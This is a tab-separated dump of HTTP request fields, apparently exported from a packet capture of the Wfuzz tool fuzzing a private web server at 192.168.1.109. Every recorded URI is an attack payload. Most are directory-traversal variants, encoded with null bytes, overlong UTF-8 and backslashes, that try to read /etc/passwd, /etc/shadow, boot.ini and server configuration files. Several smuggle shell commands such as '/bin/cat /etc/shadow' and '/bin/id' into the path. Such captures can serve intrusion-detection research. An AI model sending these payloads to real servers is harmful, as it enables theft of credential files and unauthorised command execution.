http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
*/*,*/*																					application/x-www-form-urlencoded,application/x-www-form-urlencoded						192.168.1.109,192.168.1.109									348						1,1	http://192.168.1.109/web/\..\..\..\..\..\..\..\..\..\..\etc\shadow/,http://192.168.1.109/web//../../../../../../../../../../etc/passwd/		GET,GET				HTTP/1.1,HTTP/1.1																			Wfuzz/3.1.0,Wfuzz/3.1.0				/web/\..\..\..\..\..\..\..\..\..\..\etc\shadow/,/web//../../../../../../../../../../etc/passwd/
*/*,*/*																					application/x-www-form-urlencoded,application/x-www-form-urlencoded						192.168.1.109,192.168.1.109									385						1,1	http://192.168.1.109/web//./././././././././././etc/passwd/,http://192.168.1.109/web//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow/		GET,GET				HTTP/1.1,HTTP/1.1																			Wfuzz/3.1.0,Wfuzz/3.1.0				/web//./././././././././././etc/passwd/,/web//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow/
*/*,*/*,*/*,*/*																					application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded						192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109									406,406,406						1,1,1,1	http://192.168.1.109/web/..\..\..\..\..\..\..\..\..\..\etc\passwd/,http://192.168.1.109/web/.\\./.\\./.\\./.\\./.\\./.\\./etc/shadow/,http://192.168.1.109/web/%0a/bin/cat%20/etc/shadow/,http://192.168.1.109/web//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd/		GET,GET,GET,GET				HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1																			Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0				/web/..\..\..\..\..\..\..\..\..\..\etc\passwd/,/web/.\\./.\\./.\\./.\\./.\\./.\\./etc/shadow/,/web/%0a/bin/cat%20/etc/shadow/,/web//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd/
*/*,*/*,*/*,*/*,*/*																					application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded						192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109									454,454,454,454						1,1,1,1,1	http://192.168.1.109/web//..\../..\../..\../..\../..\../..\../etc/shadow/,http://192.168.1.109/web/%00../../../../../../etc/shadow/,http://192.168.1.109/web/..\..\..\..\..\..\..\..\..\..\etc\shadow%00/,http://192.168.1.109/web/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00/,http://192.168.1.109/web//../../../../../../../../bin/id|/		GET,GET,GET,GET,GET				HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1																			Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0				/web//..\../..\../..\../..\../..\../..\../etc/shadow/,/web/%00../../../../../../etc/shadow/,/web/..\..\..\..\..\..\..\..\..\..\etc\shadow%00/,/web/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00/,/web//../../../../../../../../bin/id|/
*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*																					application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded						192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109									488,488,488,488,488,488,488						1,1,1,1,1,1,1,1	http://192.168.1.109/web//./././././././././././etc/shadow/,http://192.168.1.109/web//..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/shadow/,http://192.168.1.109/web//../../../../../../../../../../../etc/passwd%00.html/,http://192.168.1.109/web/%0a/bin/cat%20/etc/passwd/,http://192.168.1.109/web/..\..\..\..\..\..\..\..\..\..\etc\passwd%00/,http://192.168.1.109/web/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%255cboot.ini/,http://192.168.1.109/web//..\../..\../..\../..\../..\../..\../boot.ini/,http://192.168.1.109/web//../../../../../../../../../../../boot.ini/		GET,GET,GET,GET,GET,GET,GET,GET				HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1																			Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0				/web//./././././././././././etc/shadow/,/web//..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/shadow/,/web//../../../../../../../../../../../etc/passwd%00.html/,/web/%0a/bin/cat%20/etc/passwd/,/web/..\..\..\..\..\..\..\..\..\..\etc\passwd%00/,/web/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%255cboot.ini/,/web//..\../..\../..\../..\../..\../..\../boot.ini/,/web//../../../../../../../../../../../boot.ini/
*/*																					application/x-www-form-urlencoded						192.168.1.109															1	http://192.168.1.109/web/../../../../../../../../../../../../boot.ini/		GET				HTTP/1.1																			Wfuzz/3.1.0				/web/../../../../../../../../../../../../boot.ini/
*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*																					application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded						192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109									509,509,509,509,509,509,509						1,1,1,1,1,1,1,1	http://192.168.1.109/web/..\..\..\..\..\..\..\..\..\..\etc\shadow/,http://192.168.1.109/web//../../../../../../../../../../../etc/passwd%00.jpg/,http://192.168.1.109/web/%00/etc/passwd%00/,http://192.168.1.109/web/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00/,http://192.168.1.109/web/\\&apos;/bin/cat%20/etc/shadow\\&apos;/,http://192.168.1.109/web//../../../../../../../../../../../boot.ini%00.html/,http://192.168.1.109/web//.\\./.\\./.\\./.\\./.\\./.\\./boot.ini/,http://192.168.1.109/web/../../../../../../../../../../../../localstart.asp/		GET,GET,GET,GET,GET,GET,GET,GET				HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1																			Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0				/web/..\..\..\..\..\..\..\..\..\..\etc\shadow/,/web//../../../../../../../../../../../etc/passwd%00.jpg/,/web/%00/etc/passwd%00/,/web/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00/,/web/\\&apos;/bin/cat%20/etc/shadow\\&apos;/,/web//../../../../../../../../../../../boot.ini%00.html/,/web//.\\./.\\./.\\./.\\./.\\./.\\./boot.ini/,/web/../../../../../../../../../../../../localstart.asp/
*/*,*/*,*/*,*/*,*/*,*/*,*/*																					application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded						192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109									526,526,526,526,526,526						1,1,1,1,1,1,1	http://192.168.1.109/web//..\../..\../..\../..\../..\../..\../etc/passwd/,http://192.168.1.109/web/%00../../../../../../etc/passwd/,http://192.168.1.109/web/\\&apos;/bin/cat%20/etc/passwd\\&apos;/,http://192.168.1.109/web/..\..\..\..\..\..\..\..\..\..\boot.ini/,http://192.168.1.109/web//../../../../../../../../../../../boot.ini%00/,http://192.168.1.109/web/C:/boot.ini/,http://192.168.1.109/web/../../../../../../../../conf/server.xml/		GET,GET,GET,GET,GET,GET,GET				HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1																			Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0				/web//..\../..\../..\../..\../..\../..\../etc/passwd/,/web/%00../../../../../../etc/passwd/,/web/\\&apos;/bin/cat%20/etc/passwd\\&apos;/,/web/..\..\..\..\..\..\..\..\..\..\boot.ini/,/web//../../../../../../../../../../../boot.ini%00/,/web/C:/boot.ini/,/web/../../../../../../../../conf/server.xml/
*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*																					application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded						192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109									578,578,578,578,578,578,578,578,578,578,578,578						1,1,1,1,1,1,1,1,1,1,1,1,1	http://192.168.1.109/web/\..\..\..\..\..\..\..\..\..\..\etc\passwd/,http://192.168.1.109/web/.\\./.\\./.\\./.\\./.\\./.\\./etc/passwd/,http://192.168.1.109/web/\..\..\..\..\..\..\..\..\..\..\etc\shadow%00/,http://192.168.1.109/web//..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd/,http://192.168.1.109/web/%00/etc/shadow%00/,http://192.168.1.109/web/\..\..\..\..\..\..\..\..\..\..\etc\passwd%00/,http://192.168.1.109/web//%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00/,http://192.168.1.109/web/C:\boot.ini/,http://192.168.1.109/web/\..\..\..\..\..\..\..\..\..\..\boot.ini/,http://192.168.1.109/web/../../../../../../../../../../../../boot.ini%00/,http://192.168.1.109/web/C:\inetpub\wwwroot\global.asa/,http://192.168.1.109/web/%01%02%03%04%0a%0d%0aADSF/,http://192.168.1.109/web/%/		GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET				HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1																			Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0				/web/\..\..\..\..\..\..\..\..\..\..\etc\passwd/,/web/.\\./.\\./.\\./.\\./.\\./.\\./etc/passwd/,/web/\..\..\..\..\..\..\..\..\..\..\etc\shadow%00/,/web//..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd/,/web/%00/etc/shadow%00/,/web/\..\..\..\..\..\..\..\..\..\..\etc\passwd%00/,/web//%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00/,/web/C:\boot.ini/,/web/\..\..\..\..\..\..\..\..\..\..\boot.ini/,/web/../../../../../../../../../../../../boot.ini%00/,/web/C:\inetpub\wwwroot\global.asa/,/web/%01%02%03%04%0a%0d%0aADSF/,/web/%/
*/*,*/*,*/*																					application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded						192.168.1.109,192.168.1.109,192.168.1.109									593,593						1,1,1	http://192.168.1.109/web//../../../../../../../../../../../boot.ini%00.jpg/,http://192.168.1.109/web/&lt;!--,http://192.168.1.109/web//,%ENV,//		GET,GET,GET				HTTP/1.1,HTTP/1.1,HTTP/1.1																			Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0				/web//../../../../../../../../../../../boot.ini%00.jpg/,/web/&lt;!--,/web//,%ENV,//
*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*																					application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded						192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109									616,616,616,616,616,616,616,616						1,1,1,1,1,1,1,1,1	http://192.168.1.109/web//%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..winnt/desktop.ini/,http://192.168.1.109/web/..\..\..\..\..\..\..\..\..\..\boot.ini%00/,http://192.168.1.109/web//./././././././././././boot.ini/,http://192.168.1.109/web/../../../../../../../../../../../../localstart.asp%00/,http://192.168.1.109/web/C:/inetpub/wwwroot/global.asa/,http://192.168.1.109/web/}/,http://192.168.1.109/web/&lt;!--,http://192.168.1.109/web/!@,http://192.168.1.109/web//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini/		GET,GET,GET,GET,GET,GET,GET,GET,GET				HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1																			Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0				/web//%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..winnt/desktop.ini/,/web/..\..\..\..\..\..\..\..\..\..\boot.ini%00/,/web//./././././././././././boot.ini/,/web/../../../../../../../../../../../../localstart.asp%00/,/web/C:/inetpub/wwwroot/global.asa/,/web/}/,/web/&lt;!--,/web/!@,/web//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini/
*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*																					application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded						192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109									769,769,769,769,769,769,769,769,769,769,769,769,769						1,1,1,1,1,1,1,1,1,1,1,1,1,1	http://192.168.1.109/web/;/,http://192.168.1.109/web//.../.../.../.../...//,http://192.168.1.109/web/\\/,http://192.168.1.109/web/\\\\*/,http://192.168.1.109/web/<</,http://192.168.1.109/web/&,http://192.168.1.109/web/!@,http://192.168.1.109/web/@'/,http://192.168.1.109/web/*|/,http://192.168.1.109/web/</,http://192.168.1.109/web//%00//,http://192.168.1.109/web/%5C//,http://192.168.1.109/web/%3C%3F/,http://192.168.1.109/web/..%u2215/		GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET				HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1																			Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0				/web/;/,/web//.../.../.../.../...//,/web/\\/,/web/\\\\*/,/web/<</,/web/&,/web/!@,/web/@'/,/web/*|/,/web/</,/web//%00//,/web/%5C//,/web/%3C%3F/,/web/..%u2215/
*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*																					application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded						192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109									796,796,796,796,796,796,796,796,796,796,796,796,796						1,1,1,1,1,1,1,1,1,1,1,1,1,1	http://192.168.1.109/web/*/,http://192.168.1.109/web/&lt/,http://192.168.1.109/web/\/,http://192.168.1.109/web/`/,http://192.168.1.109/web/&,http://192.168.1.109/web/!'/,http://192.168.1.109/web/{'}/,http://192.168.1.109/web/--/,http://192.168.1.109/web/<<</,http://192.168.1.109/web/,http://192.168.1.109/web/%00/,http://192.168.1.109/web/%2e%2e%2f/,http://192.168.1.109/web/%20/,http://192.168.1.109/web/..%%35%63/		GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET				HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1																			Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0				/web/*/,/web/&lt/,/web/\/,/web/`/,/web/&,/web/!'/,/web/{'}/,/web/--/,/web/<<</,/web/,/web/%00/,/web/%2e%2e%2f/,/web/%20/,/web/..%%35%63/
*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*																					application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded						192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109									866,866,866,866,866,866,866,866,866,866,866,866,866,866,866,866,866,866,866						1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1	http://192.168.1.109/web/,http://192.168.1.109/web/&LT/,http://192.168.1.109/web/\\//,http://192.168.1.109/web/(')/,http://192.168.1.109/web/"\t"/,http://192.168.1.109/web/,http://192.168.1.109/web//'/,http://192.168.1.109/web/||/,http://192.168.1.109/web/,http://192.168.1.109/web/,http://192.168.1.109/web/%5C/,http://192.168.1.109/web/%2A/,http://192.168.1.109/web/..//,http://192.168.1.109/web//%2A/,http://192.168.1.109/web/&,http://192.168.1.109/web/&,http://192.168.1.109/web/&,http://192.168.1.109/web/&,http://192.168.1.109/web/&,http://192.168.1.109/web/..%u2216/		GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET				HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1																			Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0				/web/,/web/&LT/,/web/\\//,/web/(')/,/web/"\t"/,/web/,/web//'/,/web/||/,/web/,/web/,/web/%5C/,/web/%2A/,/web/..//,/web//%2A/,/web/&,/web/&,/web/&,/web/&,/web/&,/web/..%u2216/
*/*,*/*,*/*																					application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded						192.168.1.109,192.168.1.109,192.168.1.109									868,868						1,1,1	http://192.168.1.109/web/&,http://192.168.1.109/web/&,http://192.168.1.109/web/..%%35c/		GET,GET,GET				HTTP/1.1,HTTP/1.1,HTTP/1.1																			Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0				/web/&,/web/&,/web/..%%35c/
